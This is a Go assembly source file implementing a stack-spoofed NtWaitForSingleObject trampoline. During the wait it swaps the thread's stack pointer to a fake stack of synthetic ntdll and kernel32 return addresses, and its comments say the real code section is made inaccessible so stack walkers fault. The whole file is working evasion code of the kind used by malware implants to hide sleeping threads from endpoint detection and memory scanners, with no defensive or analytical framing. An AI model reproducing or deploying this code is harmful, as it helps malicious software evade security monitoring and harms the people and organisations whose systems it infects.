// Stack-spoofed NtWaitForSingleObject trampoline.
//
// Before issuing the syscall, swaps the current goroutine thread's RSP to
// a caller-supplied fake stack buffer.  During the wait the OS-visible stack
// shows only synthetic return addresses (ntdll / kernel32), making the
// sleeping thread look like a normal Windows thread-pool worker.
//
// Stack layout during wait (fakeRSP supplied by caller):
//
//   RSP  = fakeRSP - 8  (CALL pushes our real return addr here)
//  +0x08 = fakeRSP[0]  → ntdll!RtlUserThreadStart + 0x21   (fake frame 1)
//  +0x10 = fakeRSP[8]  → kernel32!BaseThreadInitThunk + 0x14 (fake frame 2)
//  +0x18 = fakeRSP[16] → 0x0  (stack walk terminator)
//
// The real return address at RSP+0 points into .text, which is PAGE_NOACCESS
// during sleep — stack walkers get an access violation trying to read it.

#include "textflag.h"

// func asmSpoofedWait(hEvent, fakeRSP, waitStub uintptr)
// Go internal ABI (amd64): AX = hEvent, BX = fakeRSP, CX = waitStub
TEXT ·asmSpoofedWait(SB),NOSPLIT|NOFRAME,$0
    // Preserve R12 (callee-saved in Go's internal ABI) on the real stack.
    PUSHQ   R12

    // Save waitStub in R11 before we overwrite CX with hEvent.
    // R11 is caller-saved and is not used by Windows x64 ABI as an argument reg.
    MOVQ    CX, R11         // R11 = waitStub

    // Save fakeRSP in R10 (caller-saved; destroyed by syscall but we use it before).
    MOVQ    BX, R10         // R10 = fakeRSP

    // Stage NtWaitForSingleObject parameters (Windows x64 ABI):
    //   RCX = Handle   (hEvent)
    //   RDX = Alertable = FALSE (0)
    //   R8  = Timeout  = NULL  (0 → wait indefinitely)
    MOVQ    AX, CX          // RCX = hEvent
    XORQ    DX, DX          // RDX = 0
    XORQ    R8, R8          // R8  = 0 (NULL timeout)

    // Save real RSP in R12.  Callee-saved → survives the syscall intact.
    // At this point SP points to the slot where R12 was PUSHed, which is
    // exactly what we need to restore after the wait.
    MOVQ    SP, R12         // R12 = real RSP (= original_SP - 8 after PUSHQ R12)

    // Swap RSP to the fake stack.
    // CALL will push our return address at SP-8 = fakeRSP-8.
    MOVQ    R10, SP         // SP = fakeRSP

    // Call NtWaitForSingleObject stub (machine code in separate VirtualAlloc).
    // After CALL: SP = fakeRSP-8, [fakeRSP-8] = addr of next instruction here.
    // The kernel schedules the thread out during 'syscall'.
    // When the event is signaled: 'syscall' returns, stub executes 'ret',
    // which pops [fakeRSP-8] (our real return addr) and lands here.
    CALL    R11             // indirect call through register = FF D3 machine code

    // SP = fakeRSP after stub's ret.  Restore the real RSP saved in R12.
    MOVQ    R12, SP         // SP = real RSP (= original_SP - 8)

    // Restore R12 (POPQ increments SP by 8 → SP = original_SP).
    POPQ    R12

    // Return to Go caller.
    RET
